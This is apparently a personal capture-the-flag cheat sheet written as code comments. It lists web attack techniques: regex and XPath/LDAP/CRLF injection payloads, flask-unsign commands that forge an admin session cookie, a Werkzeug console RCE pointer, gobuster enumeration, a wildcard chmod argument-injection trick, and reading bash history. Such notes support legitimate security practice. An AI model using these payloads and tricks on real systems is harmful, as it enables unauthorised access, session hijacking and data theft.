// Random stuff
//! Exploits
//* regex injection
// "/(^uoftctf\\{f.*$)|(^u(.*?)*o(.*?)*f(.*?)*t(.*?)*c(.*?)*t(.*?)*f(.*?)*\\{(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*~$)/";
// if the flag starts with uoftctf{f if would take short time otherwise a long time
//* flusk cookies unsign
// flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6ImRqYXdhZCJ9.aJfDAA.gbbmHRcGbgjlD3mhxbBvaxONMrY'
// flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6ImRqYXdhZCJ9.aJfDAA.gbbmHRcGbgjlD3mhxbBvaxONMrY' --wordlist 'flask.txt'
// flask-unsign --sign --cookie "{'role' : 'admin'}" --secret theabyss
//* flask Console RCE
// go to /console
// https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html
//* directory enumeration
// gobuster -u https://vm1.ctfeldjazair.dz:12335/ -w /home/sleepwell/ctf/Directories_All.txt  -t 30
// gobuster -u 94.237.57.115:55013 -w /home/sleepwell/ctf/Directories_All.txt
//* YAML
// no can be interpreted as boolean value
//* chmod 000 *
// this is intepreted as chmod 000 * every file name
// so if there is a file with the name --reference=foo.txt
// and another file named foo.txt
// it will be executed as chmod 000 --reference=foo.txt foo.txt
// and that will make the chmod get the permitions from foo.txt instead of 000
//* get comands history
// ~/.bash_history
//* CRLF injection
// %0D%0A => new line
// %0D%0A%0D%0A => end of stream
//* XPath injection
//  query f"/military/district/staff[name='Groorg' and starts-with(selfDestructCode, 'H') or '1'='1']"
//  boolean(../../*[contains(., 'flag{')])
//* LDAP injection
// wild card *
// if () trigger and error its vulnarable
//* Current directory
// /proc/self/cwd
//* Php
// preg_match() will return false if there are more then 21750 matches in the regex
// php will throw an error if there are more than 1000 queries in the request
//! usefull websites
//* hash cracker
// https://crackstation.net/
//* web hook
// https://app.beeceptor.com/console/iwillneverreapeat
//* proxy without security page
// ssh -R 80:localhost:4000 localhost.run
//* DNS rebinding
// https://lock.cmpxchg8b.com/rebinder.html
//* JavaScript Deobfuscator and Unpacker
// https://de4js.kshift.me/